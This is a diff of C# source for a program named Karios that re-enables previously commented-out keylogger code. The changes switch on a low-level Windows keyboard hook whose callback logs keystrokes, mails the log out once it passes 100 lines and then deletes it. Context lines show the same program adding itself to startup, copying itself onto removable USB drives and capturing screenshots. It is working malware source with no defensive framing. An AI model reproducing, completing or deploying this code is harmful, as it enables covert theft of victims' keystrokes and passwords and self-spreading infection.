@@ -25,13 +25,13 @@ namespace Karios
     class InterceptKeys
     {
         // ReSharper disable once InconsistentNaming
-        //private const int WH_KEYBOARD_LL = 13;
+        private const int WH_KEYBOARD_LL = 13;
 
         // ReSharper disable once InconsistentNaming
-        //private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYDOWN = 0x0100;
 
-        //private static readonly LowLevelKeyboardProc Proc = HookCallback;
-        //private static IntPtr _hookId = IntPtr.Zero;
+        private static readonly LowLevelKeyboardProc Proc = HookCallback;
+        private static IntPtr _hookId = IntPtr.Zero;
         private static string _localIp;
         private static string _globalTargetIp;
         private static string _website;
@@ -59,9 +59,9 @@ namespace Karios
                 // Start Application
                 // var handle = GetConsoleWindow();
                 // ShowWindow(handle, SwHide);
-                //_hookId = SetHook(Proc);
+                _hookId = SetHook(Proc);
                 Application.Run();
-                //UnhookWindowsHookEx(_hookId);
+                UnhookWindowsHookEx(_hookId);
             }
         }
 
@@ -218,7 +218,6 @@ namespace Karios
         }
 
         //setting hooks in keyboard
-        /*
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (var curProcess = Process.GetCurrentProcess())
@@ -228,10 +227,7 @@ namespace Karios
                     GetModuleHandle(curModule.ModuleName), 0);
             }
         }
-        */
-
-        //private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
-        /*
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             try
@@ -268,9 +264,9 @@ namespace Karios
             {
                 //ignored
             }
-            */
+            
             // The Reading part
-            /*
+            
             if (File.ReadAllLines(pathToLog).Length <= 100) return CallNextHookEx(_hookId, nCode, wParam, lParam);
             {
                 if (EmailSending == false)
@@ -280,13 +276,13 @@ namespace Karios
                     SendMail();
                 }
             }
-            */
+            
             //System.IO.File.Copy(path, Application.StartupPath + @"\log.txt", true);
             // ReSharper disable once UnusedVariable
             //delete log file.
-            //File.Delete(pathToLog);
-            //return CallNextHookEx(_hookId, nCode, wParam, lParam);
-        //}
+            File.Delete(pathToLog);
+            return CallNextHookEx(_hookId, nCode, wParam, lParam);
+        }
 
         public static void SetStartup()
         {
@@ -321,7 +317,7 @@ namespace Karios
             {
                 if (d.DriveType == DriveType.Removable && d.IsReady)
                 {
-                    //Checks if they are removable, then adds Karios into the USB with a 'friendly name'
+                    //Checks if they are removable, then adds Karios into the USB 
                     File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName,
                         d.Name + @"\" + System.AppDomain.CurrentDomain.FriendlyName, true);
                 }
@@ -423,18 +419,16 @@ namespace Karios
             return memoryImage;
         }
 
-        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        //private static extern IntPtr SetWindowsHookEx(int idHook,
-          //  LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
         //This imports the DLL's needed for some stuff
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
-        //[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        //private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
-           // IntPtr wParam, IntPtr lParam);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
